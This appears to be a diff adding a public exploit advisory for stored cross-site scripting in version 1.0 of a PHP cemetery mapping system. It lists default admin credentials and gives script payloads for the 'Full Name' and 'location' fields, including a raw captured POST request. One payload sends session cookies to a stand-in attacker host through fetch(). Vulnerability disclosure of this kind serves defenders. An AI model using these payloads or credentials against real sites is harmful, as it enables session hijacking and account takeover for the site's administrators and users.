@@ -1,0 +1,38 @@
+# Exploit Title: Cemetry Mapping and Information System 1.0 - Multiple Stored Cross-Site Scripting
+# Exploit Author: Mesut Cetin
+# Date: 2021-01-10
+# Vendor Homepage: https://www.sourcecodester.com/php/12779/cemetery-mapping-and-information-system-using-phpmysqli.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=12779&title=Cemetery+Mapping+and+Information+System+Using+PHP%2FMySQLi+with+Source+Code
+# Affected Version: 1.0
+# Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0, Burp Suite Professional v.1.7.34 
+
+Affected parameter: "full name", "location"
+
+Proof of concept:
+
+1. Login under admin panel, http://localhost/CemeteryMapping/admin/login.php, with default credentials janobe:admin
+2. Click on "Deceased Persons"
+3. Choose one of the users and click on their names to edit it
+4. In the field "Full Name" insert the payload: <script>alert(document.cookie)</script>
+5. Save and open the webpage under http://localhost/CemeteryMapping/index.php?q=person
+6. You will receive the PHPSESSID cookie as alert. The cookie values can be redirected to attacker page by using payloads like <script src="data:application/javascript,fetch(`https://attacker-page.com/${document.cookie}`)"></script>
+
+To manipulate the "location" parameter, we will use Burp Suite. Capture the request with Burp:
+
+POST /CemeteryMapping/admin/person/controller.php?action=edit HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 149
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/CemeteryMapping/admin/person/index.php?view=edit&id=1
+Cookie: PHPSESSID=h9smkdr8dvjhsjviugnvot261m
+Upgrade-Insecure-Requests: 1
+
+PEOPLEID=1&GRAVENO=1&FNAME=JACONDIA+A.MORTEL&CATEGORIES=C&BORNDATE=07%2F04%2F1992&DIEDDATE=12%2F29%2F2003&LOCATION=BUENAVISTA+LOOC+CEMETERY<script>alert(document.cookie)</script>&save=
+
+And forward the request. The cookie values will be displayed on screen.
